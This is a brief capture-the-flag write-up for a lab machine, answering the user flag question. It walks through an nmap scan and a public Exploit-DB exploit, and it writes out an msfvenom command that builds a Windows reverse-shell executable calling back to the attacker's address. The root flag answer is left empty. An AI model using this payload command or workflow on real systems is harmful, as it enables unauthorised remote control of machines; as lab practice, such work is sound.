
How low are your morals?

---

# Questions

## Q1: What is the user.txt flag?
### A: 

First we need to do an nmap scan

![](../Img/Pasted%20image%2020260316111157.png)

Searching for an exploit we get this (https://www.exploit-db.com/exploits/47799)

![](../Img/Pasted%20image%2020260316111550.png)

Download it and try it

![](../Img/Pasted%20image%2020260316111727.png)

It seems to work (not with ls tho) so now i try to get a reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.208.47 LPORT=9090 -f exe -o exploit.exe`

Then we send it

![](../Img/Pasted%20image%2020260316113516.png)

Run it

![](../Img/Pasted%20image%2020260316113426.png)

Next search for the first flag

![](../Img/Pasted%20image%2020260316113811.png)


## Q2: What is the root.txt flag?
### A: 
